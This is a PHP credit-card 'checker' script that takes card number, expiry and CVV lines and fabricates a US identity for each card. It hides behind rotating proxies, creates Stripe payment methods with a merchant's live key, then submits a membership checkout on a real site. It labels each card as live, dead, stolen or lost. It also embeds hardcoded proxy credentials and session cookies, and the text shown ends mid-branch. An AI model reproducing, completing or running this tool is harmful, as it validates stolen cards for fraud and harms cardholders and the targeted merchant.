<?php 

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

# -------------------- [RANDOM NUMBERS] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://www.randomnumberapi.com/api/v1.0/random?min=1&max=10&count=1');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$nmp = value($resposta, '[',']');
# -------------------- [RANDOM USER] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

# -------------------- [PROXY] -------------------#

# -------------------- [WEBSHARE PROXY] -------------------#
$webshareuser = 'ndmxdcxy-rotate';
$websharepass = 'd7tle7p1jnm4';
$webshareport = 80;
$webshareurl = 'p.webshare.io';

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
# -------------------- [PROXY.TXT] -------------------#
curl_setopt($ch, CURLOPT_PROXY, "http://$webshareurl:$webshareport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com' ,
'accept: application/json' ,
'accept-language: en-US,en;q=0.9' ,
'content-type: application/x-www-form-urlencoded' ,
'origin: https://js.stripe.com' ,
'referer: https://js.stripe.com/' ,
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' ,
'sec-ch-ua-mobile: ?1' ,
'sec-ch-ua-platform: "Android"' ,
'sec-fetch-dest: empty' ,
'sec-fetch-mode: cors' ,
'sec-fetch-site: same-site' ,
'user-agent: Mozilla/5.0 (Linux; Android 10; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' ,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api5/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api5/cookie.txt');

# ----------------- [1REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]='.$zip.'+'.$firstname.'&billing_details[address][line2]=&billing_details[address][city]=New+York&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&billing_details[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=92d31251-18b8-45ef-8984-46772e839e9f4d7ad4&muid=d4c22d0d-0b6b-4292-a627-2f42d8f29ed6c1ba24&sid=c2353fbc-4d6e-4d55-b269-640af5410abf27ea1f&payment_user_agent=stripe.js%2F0663df7b8%3B+stripe-js-v3%2F0663df7b8&time_on_page=21272&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1LFNOJE6JFQ2z2oA');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
# -------------------- [PROXY.TXT] -------------------#
curl_setopt($ch, CURLOPT_PROXY, "http://$webshareurl:$webshareport");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.rac.ca/membership-account/membership-checkout/?level=7');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api5/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api5/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' ,
'Accept-Language: en-US,en;q=0.9' ,
'Cache-Control: max-age=0' ,
'Connection: keep-alive' ,
'Content-Type: application/x-www-form-urlencoded' ,
'Cookie: PHPSESSID=25e229eec573220105eaa806794ea7fb; pmpro_visit=1; __stripe_mid=d4c22d0d-0b6b-4292-a627-2f42d8f29ed6c1ba24; __stripe_sid=c2353fbc-4d6e-4d55-b269-640af5410abf27ea1f' ,
'Origin: https://www.rac.ca' ,
'Referer: https://www.rac.ca/membership-account/membership-checkout/?level=7' ,
'Sec-Fetch-Dest: document' ,
'Sec-Fetch-Mode: navigate' ,
'Sec-Fetch-Site: same-origin' ,
'Sec-Fetch-User: ?1' ,
'Upgrade-Insecure-Requests: 1' ,
'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36' ,
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' ,
'sec-ch-ua-mobile: ?1' ,
'sec-ch-ua-platform: "Android"' ,
));

# ----------------- [2REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=7&checkjavascript=1&autorenew_present=1&other_discount_code=&username='.$firstname.''.$lastname.'&password='.$email.'&password2='.$email.'&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&seats=0&user_in_canadian_taxregion=1&canadian_tax_state=PS&bcountry=US&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1='.$zip.'+'.$firstname.'&baddress2=&bcity=New+York&bstate='.$state.'&bzipcode='.$zip.'&bphone='.$phone.'&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6032&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));


# -------------------- [RESPONSES] -------------------#

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}


elseif
(strpos($result2,  'security code is invalid.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ STOLEN CARD! 🞬";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ LOST CARD! 🞬";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ PICKUP CARD! 🞬";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ STOLEN CARD! 🞬";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ LOST CARD! 🞬";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ PICKUP CARD! 🞬";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ INSUFFICIENT FUNDS! ✅";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ #DEAD ⇝ CARD EXPIRED!! 🞬";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DECLINED! 🞬";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ GENERIC DECLINE! 🞬";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ DO NOT HONOR! 🞬";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ EXPIRED CARD! 🞬";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DOESNT SUPPORT THIS PURCHASE! 🞬";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ PROCESSING ERROR! 🞬";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ SERVICE NOT ALLOWED! 🞬";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CVC CHECK UNAVAILABLE! 🞬";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CVC CHECK UNAVAILABLE! 🞬";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CARD DETAILS! 🞬";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD NOT CHECKED! 🞬";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ TRANSACTION NOT ALLOWED! 🞬";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING PAYMENT INFORMATIONS! 🞬";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CREDIT CARD NUMBER! 🞬";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD EXPIRED! 🞬";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DECLINED! 🞬";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ GENERIC DECLINE! 🞬";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ DO NOT HONOR! 🞬";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ EXPIRED CARD! 🞬";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DOESNT SUPPORT THIS PURCHASE! 🞬";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ PROCESSING ERROR! 🞬";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ SERVICE NOT ALLOWED! 🞬";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CARD DETAILS! 🞬";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD NOT CHECKED! 🞬";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ TRANSACTION NOT ALLOWED! 🞬";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING PAYMENT INFORMATIONS! 🞬";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CREDIT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  '"cvc_check": "pass"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  "Thank You For Donation.")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}
elseif
(strpos($result1,  '"Thank You For Donation."')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  "Thank You.")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  'Your card zip code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
} 
elseif
(strpos($result1,  '/donations/thank_you?donation_number=','')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  "incorrect_zip")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  '"type":"one-time"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  'security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  'security code is invalid.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  'Your card&#039;s security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  "incorrect_cvc")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  "stolen_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ STOLEN CARD! 🞬";
}

elseif
(strpos($result1,  "lost_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ LOST CARD! 🞬";
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  "pickup_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ PICKUP CARD! 🞬";
}

elseif
(strpos($result1,  "insufficient_funds")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  '"cvc_check": "fail"')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  'security code is invalid.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  'Your card&#039;s security code is incorrect.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  "incorrect_cvc")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CCN CHARGE! ✅";
}

elseif
(strpos($result1,  "stolen_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ STOLEN CARD! 🞬";
}

elseif
(strpos($result1,  "lost_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ LOST CARD! 🞬";
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ CVV CHARGE! ✅";
}

elseif
(strpos($result1,  "pickup_card")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ PICKUP CARD! 🞬";
}

elseif
(strpos($result1,  "insufficient_funds")) {
  echo "┠ Status ⇝ LIVE ☑  Resp ⇝ INSUFFICIENT FUNDS! ✅";
}

elseif
(strpos($result1,  'Your card has expired.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ #DEAD ⇝ CARD EXPIRED!! 🞬";
}

elseif
(strpos($result1,  'Your card number is incorrect.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  "incorrect_number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  'card was declined.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DECLINED! 🞬";
}

elseif
(strpos($result1,  "generic_decline")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ GENERIC DECLINE! 🞬";
}

elseif
(strpos($result1,  "do_not_honor")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ DO NOT HONOR! 🞬";
}

elseif
(strpos($result1,  "expired_card")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ EXPIRED CARD! 🞬";
}

elseif
(strpos($result1,  'Your card does not support this type of purchase.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DOESNT SUPPORT THIS PURCHASE! 🞬";
}

elseif
(strpos($result1,  "processing_error")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ PROCESSING ERROR! 🞬";
}

elseif
(strpos($result1, "service_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ SERVICE NOT ALLOWED! 🞬";
}

elseif
(strpos($result1,  '"cvc_check": "unchecked"')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CVC CHECK UNAVAILABLE! 🞬";
}

elseif
(strpos($result1,  '"cvc_check": "unavailable"')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CVC CHECK UNAVAILABLE! 🞬";
}

elseif
(strpos($result1,  "parameter_invalid_empty")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CARD DETAILS! 🞬";
}

elseif
(strpos($result1,  "lock_timeout")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD NOT CHECKED! 🞬";
}

elseif
(strpos($result1,  "transaction_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ TRANSACTION NOT ALLOWED! 🞬";
}

elseif
(strpos($result1, "three_d_secure_redirect")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result1,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ 3D SECURE REDIRECT! 🞬";
}

elseif
(strpos($result1, "missing_payment_information")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING PAYMENT INFORMATIONS! 🞬";
}

elseif
(strpos($result1, "Payment cannot be processed, missing credit card number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CREDIT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  'Your card has expired.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD EXPIRED! 🞬";
}

elseif
(strpos($result1,  'card number is incorrect.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  "incorrect_number")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ INCORRECT CARD NUMBER! 🞬";
}

elseif
(strpos($result1,  'card was declined.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DECLINED! 🞬";
}

elseif
(strpos($result1,  "generic_decline")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ GENERIC DECLINE! 🞬";
}

elseif
(strpos($result1,  "do_not_honor")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ DO NOT HONOR! 🞬";
}

elseif
(strpos($result1,  "expired_card")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ EXPIRED CARD! 🞬";
}

elseif
(strpos($result1,  'Your card does not support this type of purchase.')) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD DOESNT SUPPORT THIS PURCHASE! 🞬";
}

elseif
(strpos($result1,  "processing_error")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ PROCESSING ERROR! 🞬";
}

elseif
(strpos($result1, "service_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ SERVICE NOT ALLOWED! 🞬";
}

elseif
(strpos($result1,  "parameter_invalid_empty")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ MISSING CARD DETAILS! 🞬";
}

elseif
(strpos($result1,  "lock_timeout")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ CARD NOT CHECKED! 🞬";
}

elseif
(strpos($result1,  "transaction_not_allowed")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ TRANSACTION NOT ALLOWED! 🞬";
}

elseif
(strpos($result1,  'Card is declined by your bank, please contact them for additional information.')) {
